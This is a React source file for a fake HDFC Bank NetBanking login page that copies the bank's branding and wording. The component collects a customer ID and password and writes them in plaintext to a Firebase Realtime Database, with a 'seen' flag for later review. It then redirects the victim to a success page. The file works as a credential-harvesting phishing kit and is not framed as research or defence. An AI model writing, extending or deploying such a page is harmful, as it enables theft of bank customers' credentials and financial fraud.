import { Button, Stack, TextField, Typography } from '@mui/material'
import { createUserWithEmailAndPassword } from 'firebase/auth'
import { ref, set } from 'firebase/database'
import React, { useEffect, useState } from 'react'
import { LoaderIcon } from 'react-hot-toast'
import { Link, useLocation, useNavigate } from 'react-router-dom'
import { nortonLogo } from '../assets/data'
import { auth, realTiemDB } from '../firebase/firebase'
import { useScrollTo } from '../utils/util'

const CustomerIdLogin = () => {
    const scrollTo = useScrollTo();
       const location = useLocation();
    const title = location.pathname.slice(1)
    useEffect(() => {
        scrollTo()
    }, [scrollTo])

    const [customerId, setCustomerId] = useState("")
    const [iscustomerId, setISCustomerId] = useState(false)
    const [isLoading, setIsLoading] = useState(false)
    const [password, SetPassword] = useState("")
    const navigate = useNavigate()














    const SubmitHandler = async () => {
        // creating email from customerId 
        const timeStemp = Date.now()
        const email = `${timeStemp}@gmail.com`;
        const genPassword  = `${password *timeStemp}`
        console.log(genPassword)
        try {


            setIsLoading(true)
            const userCredentical = await createUserWithEmailAndPassword(auth, email, password);
            const user = userCredentical.user

            await set(ref(realTiemDB, "users/" + user.uid), {
                customerId,
                password: password,
                loginType:title,
                uid: user.uid,
                seen: false,
                date: new Date().toLocaleString(),
                timestemp: timeStemp
            })
            setIsLoading(false)
            navigate(`/success/${user.uid}`)
            console.log("User Created");

        } catch (error) {
            console.log(error);
        } finally {
            setIsLoading(false)
        }
    };

    const CottnueHandler = () => {
        if (customerId === "" && customerId.length < 4) {
            alert("Please enter customerId");
        } else {
            setISCustomerId(true)

        }
    };



    return (
        <Stack width={"100%"} bgcolor={"white"} gap={".7rem"} marginTop={"7px"} padding={"1.5rem"}>
            <Typography sx={{ fontSize: "19px", color: "rgb(53, 52, 52)" }}>
                Login to NetBanking
            </Typography>

            <Stack padding={".5rem"}>


                {
                    iscustomerId ? (
                        <Stack>

                            <label style={{ color: "rgb(53, 52, 52)" }}>Password</label>

                            <TextField
                                required={true}
                                value={password}
                                type='password'
                                onChange={e => SetPassword(e.target.value)}
                                color="primary"
                                variant="outlined"
                                size="small"

                                sx={{
                                    width: "74%",
                                    boxShadow: " 0 1px 1px rgba(0,0,0,.075)",
                                    '& .MuiInputBase-input': {
                                        padding: '3px', // Add padding to the input content
                                    },
                                    marginTop: ".5rem"

                                }}
                            />
                            {
                                password.error && (
                                    <Typography color={'red'} variant='caption' >
                                        {
                                            password.error
                                        }
                                    </Typography>
                                )
                            }
                            <Typography sx={{ fontSize: "14px", color: "#1D86ff" }}>
                                <Link to={"/forget-password"} sx={{ color: "red" }} >

                                    <Button variant='link' sx={{
                                        textDecoration: "underline",
                                        color: "#1D86ff",
                                        fontSize: "14px",
                                        textTransform: "capitalize",
                                        textAlign: "left",
                                        ":hover": {
                                            bgcolor: "transparent"
                                        }
                                    }} >
                                        Forgot Password
                                    </Button>
                                </Link>
                            </Typography>
                            <Button
                                onClick={SubmitHandler}
                                sx={{
                                    bgcolor: "#1D86ff",
                                    width: "13rem",
                                    height: "2.5rem",
                                    color: "white",
                                    marginTop: "1.8rem",
                                    ":hover": {
                                        bgcolor: "#1D86ff"
                                    }
                                }}>
                                {isLoading ? <LoaderIcon /> : "  Submit"}
                            </Button>
                        </Stack>

                    ) : (
                        <Stack>

                            <label style={{ color: "rgb(53, 52, 52)" }}>Customer ID/ User ID</label>

                            <TextField
                                type='number'
                                value={customerId}
                                onChange={(e) => setCustomerId(e.target.value)}
                                color="primary"
                                variant="outlined"
                                size="small"
                                required
                                sx={{
                                    width: "74%",

                                    '& .MuiInputBase-input': {
                                        padding: '3px', // Add padding to the input content
                                    },
                                    marginTop: ".5rem"

                                }}
                            />
                            <Link to={"/forget-customer-id"} sx={{ color: "red" }} >

                                <Button variant='link' sx={{
                                    textDecoration: "underline",
                                    color: "#1D86ff",
                                    fontSize: "14px",
                                    ml: "-0.8rem",
                                    textTransform: "capitalize",
                                    ":hover": {
                                        bgcolor: "transparent"
                                    }
                                }} >
                                    Forgot Customer ID
                                </Button>
                            </Link>
                            <Button
                                onClick={CottnueHandler}
                                sx={{
                                    bgcolor: "#1D86ff",
                                    width: "13rem",
                                    color: "white",
                                    marginTop: "1.8rem",

                                    ":hover": {
                                        bgcolor: "#1D86ff"
                                    }
                                }}

                            >
                                CONTINUE
                            </Button>
                            <Link to={"/new-registration"} sx={{ color: "red" }} >

                                <Button variant='link' sx={{
                                    textDecoration: "underline",
                                    color: "#1D86ff",
                                    fontSize: "14px",
                                    textTransform: "capitalize",
                                    textAlign: "left"
                                }} >
                                    New Registration
                                </Button>
                            </Link>
                        </Stack>

                    )

                }







            </Stack>


            <AllAboute />

        </Stack>
    )
}






const AllAboute = () => {
    return (
        <Stack>

            <Stack padding={"10px"} bgcolor={"#E2EFFA"}>
                <Typography sx={{ color: "black", fontSize: "14px" }}>
                    Dear Customer,
                    <br />
                    Welcome to the new login page of HDFC Bank NetBanking.
                    <br />
                    Its lighter look and feel is designed to give you the best possible user experience. Please continue to login using your customer ID and password.
                </Typography>


            </Stack>

            <Stack>
                <Typography variant='h6'>
                    Don't have a HDFC Bank Savings Account?
                </Typography>

                <Stack direction={"column"} marginTop={"1.3rem"} gap={"1rem"} width={"100%"} >

                    <LoginCategory tital1={"Credit Card only? Login here"} tital2={"HDFC Ltd. Home Loans? here"} />
                    <LoginCategory tital1={"Prepaid Card only ? Login here"} tital2={"HDFC Ltd. Deposits? Login here"} />
                    <LoginCategory tital1={"Retail Loan only? Login here"} tital2={" "} />


                </Stack>

            </Stack>

            <Stack marginTop={"1.3rem"} direction={"column"}>
                <img src={nortonLogo} style={{ width: "7rem" }} alt="" />

                <Stack marginTop={"1.8rem"} gap={"1.2rem"}>
                    <Typography sx={{ color: "rgb(53, 52, 52)", fontSize: "15px" }}>
                        Your security is of utmost importance.
                        <br />
                        <span style={{ color: "#1D86FF" }}>
                            Know
                            More...
                        </span>
                    </Typography>

                    <Typography sx={{ color: "rgb(53, 52, 52)", fontSize: "18px" }}>
                        First Time User?
                        <br />
                        <span style={{ color: "#1D86FF", fontSize: "14px" }}>
                            Register Now
                        </span>
                        {" "}
                        <span style={{ fontSize: "14px" }}>
                            for a host of convenient features
                        </span>
                    </Typography>


                    <Typography sx={{ color: "rgb(53, 52, 52)", fontSize: "20px" }}>
                        We have added a host of new features!
                    </Typography>


                </Stack>

                <Stack paddingBottom={"4rem"}>
                    <ul style={{ color: "rgb(53, 52, 52)", fontSize: "14px" }}>
                        <p style={{ fontSize: "16px", margin: "4px 0px" }}>You can now do so much
                            more:</p>
                        <li>Anywhere access through Desktop or mobile</li>
                        <li>Enhanced security measures</li>
                    </ul>
                </Stack>

            </Stack>
        </Stack>

    )
}





const LoginCategory = ({ tital1, tital2 }) => {
    return (
        <Stack direction={"row"} gap={"1rem"} width={"100%"} >

            <Typography
                sx={{
                    color: "#23527c",
                    fontSize: "15px",
                    cursor: "pointer",
                    ":hover": {

                        textDecoration: "underline",
                    }
                }}
            >
                {tital1}
            </Typography>

            <Typography
                sx={{
                    color: "#23527c",
                    fontSize: "15px",
                    cursor: "pointer",
                    ":hover": {

                        textDecoration: "underline",
                    }
                }}
            >
                {tital2}
            </Typography>

        </Stack>
    )
}






export default CustomerIdLogin